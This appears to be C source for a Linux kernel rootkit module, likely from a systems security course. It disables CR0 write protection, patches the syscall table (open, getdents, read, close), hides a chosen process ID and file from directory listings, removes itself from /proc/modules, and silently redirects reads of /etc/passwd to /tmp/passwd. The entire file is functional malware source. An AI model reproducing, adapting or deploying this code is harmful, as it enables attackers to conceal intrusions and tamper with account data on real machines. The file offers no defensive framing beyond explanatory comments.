#include <linux/module.h>      // for all modules 
#include <linux/init.h>        // for entry/exit macros 
#include <linux/kernel.h>      // for printk and other kernel bits 
#include <asm/current.h>       // process information
#include <linux/sched.h>
#include <linux/highmem.h>     // for changing page permissions
#include <asm/unistd.h>        // for system call constants
#include <linux/kallsyms.h>
#include <asm/page.h>
#include <asm/cacheflush.h>
#define BUFFLEN 256

static char * sneaky_pid = "";
module_param(sneaky_pid, charp, S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH);
MODULE_PARM_DESC(sneaky_pid, "Sneaky proc PID");

/*system specific
struct linux_dirent {
    u64 long  d_ino;
    s64 d_off;
    unsigned short d_reclen;
    char           d_name[];
};
*/

struct linux_dirent {
  u64 d_ino;
  s64 d_off;
  unsigned short d_reclen;
  char d_name[BUFFLEN];
};

//Macros for kernel functions to alter Control Register 0 (CR0)
//This CPU has the 0-bit of CR0 set to 1: protected mode is enabled.
//Bit 0 is the WP-bit (write protection). We want to flip this to 0
//so that we can change the read/write permissions of kernel pages.
#define read_cr0() (native_read_cr0())
#define write_cr0(x) (native_write_cr0(x))

//These are function pointers to the system calls that change page
//permissions for the given address (page) to read-only or read-write.
//Grep for "set_pages_ro" and "set_pages_rw" in:
//      /boot/System.map-`$(uname -r)`
//      e.g. /boot/System.map-3.13.0.77-generic
void (*pages_rw)(struct page *page, int numpages) = (void *)0xffffffff81059d90;
void (*pages_ro)(struct page *page, int numpages) = (void *)0xffffffff81059df0;

//This is a pointer to the system call table in memory
//Defined in /usr/src/linux-source-3.13.0/arch/x86/include/asm/syscall.h
//We're getting its adddress from the System.map file (see above).
static unsigned long *sys_call_table = (unsigned long*)0xffffffff81801400;

//Function pointer will be used to save address of original 'open' syscall.
//The asmlinkage keyword is a GCC #define that indicates this function
//should expect ti find its arguments on the stack (not in registers).
//This is used for all system calls.
asmlinkage int (*original_call)(const char *pathname, int flags);
asmlinkage int (*original_getdents)(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
asmlinkage ssize_t (*original_read)(int fd, void *buf, size_t count);
asmlinkage int (*original_close)(int fd);

//flag to monitor open stream
static int file_descr = -1;
#define PROC_MOD "/proc/modules"

asmlinkage int sneaky_close(int fd)
{
  if (fd == file_descr) {
    printk(KERN_INFO "Sneaky close!\n");
    file_descr = -1;
  }
  return original_close(fd);
}

#define SNEAKY_PROC "sneaky_process"

asmlinkage int sneaky_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count)
{

    int nread;
    int bpos;
    struct linux_dirent *d;
    char d_type;
    nread = original_getdents(fd, dirp, count);

    for (bpos = 0; ((bpos >= 0) && (bpos < nread));) {
        int rec_size;
        int found = 0;
        d = (struct linux_dirent *) ((char*)dirp + bpos);
        rec_size = (int)d->d_reclen;
        d_type = *((char*)dirp + bpos + d->d_reclen - 1);
        if ((d_type == DT_REG) && (0 == strcmp(d->d_name, SNEAKY_PROC))) {
            printk(KERN_INFO "Sneaky file %s!\n", d->d_name);
            // need to remove the entry
            found = 1;
        } else if ((d_type == DT_DIR) && (0 == strcmp(d->d_name, sneaky_pid))) {
            printk(KERN_INFO "Sneaky pid %s!\n", d->d_name);
            found = 1;
        }
        if (found) {
            memcpy(d, (char*)d + d->d_reclen, nread - (int)(((char*)d + d->d_reclen)- (char*)dirp));
            nread -= rec_size;
            break;
        }
        bpos += rec_size;
    }

    return nread;

}

#define PASSWD_FILE "/etc/passwd"
#define TMP_PASSWD_FILE "/tmp/passwd"
//Define our new sneaky version of the 'open' syscall
asmlinkage int sneaky_sys_open(const char *pathname, int flags)
{
  //printk(KERN_INFO "Very, very Sneaky!\n");
  if(0 == strcmp(PASSWD_FILE, pathname)) {
      //since PASSWD_FILE == TMP_PASSWD_FILE in # of bytes
      char tmp_buf[sizeof(PASSWD_FILE)];
      int ret;
      if (copy_from_user(tmp_buf, pathname, sizeof(tmp_buf))) {
          return -EFAULT;
      }

      //try, keep going on failure
      if(!copy_to_user(pathname, TMP_PASSWD_FILE, sizeof(TMP_PASSWD_FILE))) {
          printk(KERN_INFO "Sneaky filename substitution! Success\n");
      }

      ret = original_call(pathname, flags);
      // reset the buf back
      if(copy_to_user(pathname, tmp_buf, sizeof(tmp_buf))) {
          //return -EFAULT;
          //Nothing we can do here
      }
      return (ret);
  } else {
      int ret = original_call(pathname, flags);
      if (0 == strcmp(pathname, PROC_MOD)) {
          printk(KERN_INFO "Sneaky Open!\n");
          file_descr = ret;
      }
      return (ret);
  }
}

#define SNEAKY_MOD "sneaky_mod"
asmlinkage ssize_t sneaky_read(int fd, void *buf, size_t count)
{
    ssize_t ret = original_read(fd, buf, count);
    if ((file_descr >= 0) && (file_descr == fd)) {
        char * sn_ptr, * nl_ptr;
        // We need to look into this case
        //printk(KERN_INFO "Sneaky read, found the buffer\n");
        sn_ptr = strstr(buf,SNEAKY_MOD);
        if (NULL != sn_ptr) {
            //printk(KERN_INFO "Sneaky read, found the string\n");
            nl_ptr = strchr(sn_ptr, '\n');
            if (NULL != nl_ptr) {
                //printk(KERN_INFO "Sneaky read, we are in business %s\n", (char *)buf);
                memcpy(sn_ptr, nl_ptr+1, ret - (int)((nl_ptr - (char *)buf)));
                //printk(KERN_INFO "Sneaky new  %s \n", (char *)buf);
                ret -=(int)(nl_ptr - sn_ptr);
            }
        }
    }
    return ret;
}

//The code that gets executed when the module is loaded
 static int initialize_sneaky_module(void)
 {
   struct page *page_ptr;

   //See /var/log/syslog for kernel print output
   printk(KERN_INFO "Sneaky module being loaded.\n");

   //Turn off write protection mode
   write_cr0(read_cr0() & (~0x10000));
   //Get a pointer to the virtual page containing the address
   //of the system call table in the kernel.
   page_ptr = virt_to_page(&sys_call_table);
   //Make this page read-write accessible
   pages_rw(page_ptr, 1);

   //This is the magic! Save away the original 'open' system call
   //function address. Then overwrite its address in the system call
   //table with the function address of our new code.
   original_call = (void*)*(sys_call_table + __NR_open);
   *(sys_call_table + __NR_open) = (unsigned long)sneaky_sys_open;

   original_getdents = (void*)*(sys_call_table + __NR_getdents);
   *(sys_call_table + __NR_getdents) = (unsigned long)sneaky_getdents;

   original_read = (void*)*(sys_call_table + __NR_read);
   *(sys_call_table + __NR_read) = (unsigned long)sneaky_read;

   original_close = (void*)*(sys_call_table + __NR_close);
   *(sys_call_table + __NR_close) = (unsigned long)sneaky_close;

   //Revert page to read-only
   pages_ro(page_ptr, 1);
   //Turn write protection mode back on
   write_cr0(read_cr0() | 0x10000);

   printk(KERN_INFO "Sneaky process pid %s.\n", sneaky_pid);

   return 0;       // to show a successful load 
 }  


 static void exit_sneaky_module(void) 
 {
   struct page *page_ptr;

   printk(KERN_INFO "Sneaky module being unloaded.\n"); 

   //Turn off write protection mode
   write_cr0(read_cr0() & (~0x10000));

   //Get a pointer to the virtual page containing the address
   //of the system call table in the kernel.
   page_ptr = virt_to_page(&sys_call_table);
   //Make this page read-write accessible
   pages_rw(page_ptr, 1);

   //This is more magic! Restore the original 'open' system call
   //function address. Will look like malicious code was never there!
   *(sys_call_table + __NR_open) = (unsigned long)original_call;
   *(sys_call_table + __NR_getdents) = (unsigned long)original_getdents;
   *(sys_call_table + __NR_close) = (unsigned long)original_close;
   *(sys_call_table + __NR_read) = (unsigned long)original_read;
   //Revert page to read-only
   pages_ro(page_ptr, 1);
   //Turn write protection mode back on
   write_cr0(read_cr0() | 0x10000);
 }  


 module_init(initialize_sneaky_module);  // what's called upon loading 
 module_exit(exit_sneaky_module);        // what's called upon unloading  
